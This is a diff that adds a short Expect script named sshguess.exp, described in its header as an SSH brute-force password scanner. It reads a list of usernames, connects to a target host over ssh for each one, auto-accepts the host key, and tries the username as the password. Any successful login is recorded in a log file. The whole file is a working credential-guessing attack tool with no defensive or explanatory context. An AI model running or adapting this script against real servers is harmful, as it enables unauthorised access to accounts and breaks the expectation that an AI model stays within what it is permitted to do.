@@ -1,0 +1,59 @@
+#!/usr/bin/expect -f
+
+#
+# sshguess.exp - SSH bruteforce password scanner
+# Copyright (c) 2004 by Matteo Cantoni <goony@nothink.org>
+#
+
+set timeout 5 
+log_user 0 
+
+if { $argc != 4 } {
+	send_user "Usage   : $argv0 host userlist logfile timeout\nExample : ./sshguess.exp 192.168.0.1 userlist logfile 3\n"
+	exit
+}
+
+set host [lindex $argv 0]
+set userlist [lindex $argv 1]
+set log [lindex $argv 2]
+set time [lindex $argv 3]
+
+set file [open $userlist r]
+set log [open $log a] 
+
+set prompt "(%|#|\\$|>) $"
+
+while {[gets $file user] != -1} {
+	puts "try with $user"
+	spawn ssh $user@$host 
+	expect {
+		-re "Are you sure you want to continue connecting (yes/no)?" {
+			send "yes\r"
+		}
+	}
+	expect {
+		-re "$user@$host's password: " {
+			send "$user\r"
+		}
+	}
+	expect {
+		-re ".*$prompt" {
+			send "exit\r"
+			puts $log "$host $user/$user"
+			puts "** $user/$user **"
+		}
+		-re "Permission denied, please try again." {
+			send "$user\r"
+		}
+	}
+	expect {
+		-re "ssh_exchange_identification: Connection closed by remote host\r\r\n" {
+			next
+		}
+	}
+
+	sleep $time 
+} 
+
+close $file
+close $log
